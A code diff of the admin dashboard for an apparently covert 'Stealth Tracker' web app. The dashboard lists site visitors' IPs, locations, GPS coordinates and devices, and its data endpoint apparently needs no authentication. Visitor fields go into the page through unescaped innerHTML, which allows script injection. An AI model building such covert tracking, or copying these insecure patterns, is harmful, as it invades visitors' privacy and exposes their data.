@@ -3,57 +3,49 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>🔐 Stealth Tracker - Admin</title>
-    <style>/* Same CSS */</style>
+    <title>🔐 Stealth Tracker Admin</title>
+    <style>/* Same CSS as before - keeping it short */</style>
 </head>
 <body>
-    <!-- Same HTML structure -->
     <div class="container">
-        <!-- Stats grid same as before -->
+        <div class="header">
+            <h1>🔐 Stealth Tracker - Vercel</h1>
+            <p>Live visitor data</p>
+        </div>
         <div class="stats-grid">
             <div class="stat-card"><div class="stat-number" id="totalVisits">0</div><div class="stat-label">Total</div></div>
             <div class="stat-card"><div class="stat-number" id="uniqueIPs">0</div><div class="stat-label">Unique IPs</div></div>
-            <div class="stat-card"><div class="stat-number" id="liveVisitors">0</div><div class="stat-label">Live<span class="live-indicator"></span></div></div>
+            <div class="stat-card"><div class="stat-number" id="liveVisitors">0</div><div class="stat-label">Live</div></div>
             <div class="stat-card"><div class="stat-number" id="todayVisits">0</div><div class="stat-label">Today</div></div>
         </div>
-        
         <div class="visitors-table">
-            <div style="padding: 0 30px 20px;">
-                <button class="refresh-btn" onclick="loadData()">🔄 Refresh</button>
-                <button class="refresh-btn" onclick="window.open('/debug')" style="background:#10b981;">🐛 Debug</button>
-                <button class="refresh-btn" onclick="exportCSV()">💾 Export CSV</button>
-            </div>
+            <button class="refresh-btn" onclick="loadData()">🔄 Refresh</button>
             <table>
-                <thead>
-                    <tr>
-                        <th>ID</th><th>IP</th><th>Location</th><th>GPS</th><th>Device</th><th>Time</th><th>ISP</th>
-                    </tr>
-                </thead>
+                <thead><tr><th>ID</th><th>IP</th><th>Location</th><th>GPS</th><th>Device</th><th>Time</th></tr></thead>
                 <tbody id="visitorsTable"></tbody>
             </table>
         </div>
     </div>
 
     <script>
-        // FIXED - No auth header needed now
+        // ✅ FIXED: Correct Vercel API path
         async function loadData() {
             try {
-                console.log('📡 Fetching data...');
-                const response = await fetch('/admin-data');
+                console.log('📡 Fetching /api/admin-data...');
+                const response = await fetch('/api/admin-data');
                 
                 if (!response.ok) {
-                    throw new Error(`HTTP ${response.status}: ${response.statusText}`);
+                    throw new Error(`HTTP ${response.status}`);
                 }
                 
                 const data = await response.json();
-                console.log('✅ Data received:', data);
+                console.log('✅ Data loaded:', data.totalVisits, 'visits');
                 updateDashboard(data);
-            } catch (e) {
-                console.error('❌ Load failed:', e);
-                alert('Error: ' + e.message + '\nCheck server console!');
+            } catch (error) {
+                console.error('❌ Error:', error);
             }
         }
-        
+
         function updateDashboard(data) {
             document.getElementById('totalVisits').textContent = data.totalVisits || 0;
             document.getElementById('uniqueIPs').textContent = data.uniqueIPs || 0;
@@ -62,35 +54,17 @@
             
             const tbody = document.getElementById('visitorsTable');
             tbody.innerHTML = '';
-            
-            (data.visitors || []).forEach(visitor => {
+            (data.visitors || []).forEach(v => {
                 const row = tbody.insertRow();
                 row.innerHTML = `
-                    <td>${visitor.id}</td>
-                    <td>${visitor.ip}</td>
-                    <td>${visitor.location?.full || 'Loading...'}</td>
-                    <td style="font-size:1.2em;">${visitor.gps || '❌'}</td>
-                    <td>${visitor.platform} ${visitor.screen}</td>
-                    <td>${new Date(visitor.visitTime).toLocaleString()}</td>
-                    <td>${visitor.location?.isp || '-'}</td>
+                    <td>${v.id}</td><td>${v.ip}</td><td>${v.location?.full || '-'}</td>
+                    <td style="font-size:1.2em;">${v.gps || '❌'}</td>
+                    <td>${v.platform} ${v.screen}</td><td>${new Date(v.visitTime).toLocaleString()}</td>
                 `;
             });
         }
-        
-        function exportCSV() {
-            const data = document.getElementById('visitorsTable').rows;
-            let csv = 'ID,IP,Location,GPS,Device,Time,ISP\n';
-            for (let i = 1; i < data.length; i++) {
-                csv += Array.from(data[i].cells).map(cell => `"${cell.textContent}"`).join(',') + '\n';
-            }
-            const blob = new Blob([csv], { type: 'text/csv' });
-            const url = URL.createObjectURL(blob);
-            const a = document.createElement('a');
-            a.href = url; a.download = `tracking-${new Date().toISOString().slice(0,10)}.csv`;
-            a.click();
-        }
-        
-        // Auto refresh
+
+        // Auto-refresh every 2 seconds
         loadData();
         setInterval(loadData, 2000);
     </script>
